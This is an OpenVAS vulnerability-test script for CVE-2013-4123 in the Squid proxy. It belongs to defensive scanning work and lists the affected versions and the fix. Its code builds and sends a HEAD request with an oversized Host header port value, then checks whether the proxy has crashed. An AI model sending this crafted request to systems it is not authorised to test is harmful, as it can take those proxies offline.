###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_squid_host_hdr_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Squid Proxy Host Header Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802057";
CPE = "cpe:/a:squid-cache:squid";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-4123");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-12 12:42:47 +0530 (Mon, 12 Aug 2013)");
  script_name("Squid Proxy Host Header Denial Of Service Vulnerability");

  tag_summary =
"This host is running Squid Proxy Server and is prone to Denial Of Service
vulnerability.";

  tag_vuldetect =
"Send crafted 'Host' header request and check is it vulnerable to DoS or not.";

  tag_insight =
"Error when handling port number values within the 'Host' header of HTTP
requests.";

  tag_impact =
"Successful exploitation could allow remote attackers to cause a denial of
service via a crafted port number values in the 'Host' header.";

  tag_affected =
"Squid Version 3.2 through 3.2.12 and versions 3.3 through 3.3.7";

  tag_solution =
"Upgrade to Squid Version 3.2.13 or 3.3.8 or latest or apply patch,
For updates refer to http://www.squid-cache.org/Download";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/95257");
  script_xref(name : "URL" , value : "http://www.scip.ch/en/?vuldb.9547");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54142");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Jul/98");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/527294");
  script_xref(name : "URL" , value : "http://www.squid-cache.org/Advisories/SQUID-2013_3.txt");
  script_summary("Check Squid Proxy Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_squid_detect.nasl");
  script_mandatory_keys("squid_proxy_server/installed");
  script_require_ports("Services/www","Services/http_proxy",3128,8080);
  exit(0);
}

include("host_details.inc");
include("http_func.inc");

## Variable initilisation
soc = "";
squid_port = 0;
crafted_req = "";
crafted_res = "";
crafted_port_value = "";

## Get HTTP Port
squid_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!squid_port){
  exit(0);
}

## Check port state
if(!get_port_state(squid_port)){
  exit(0);
}

## crafted port value
crafted_port_value = crap(length:2000, data:"AZ");

## Construct the HEAD HTTP request
crafted_req = string( "HEAD http://testhostdoesnotexists.com HTTP/1.1\r\n",
                      "Host: ", "testhostdoesnotexists.com",
                                ":", crafted_port_value, "\r\n",
                      "User-Agent: OpenVAS-Agent\r\n", "\r\n" );

## Send and Receive the response
crafted_res = http_send_recv(port:squid_port, data:crafted_req);

## sleep for 3 seconds
sleep(3);

## Check squid is dead or alive
soc = http_open_socket(squid_port);
if(!soc){
  security_warning(port:squid_port);
  exit(0);
}
http_close_socket(soc);
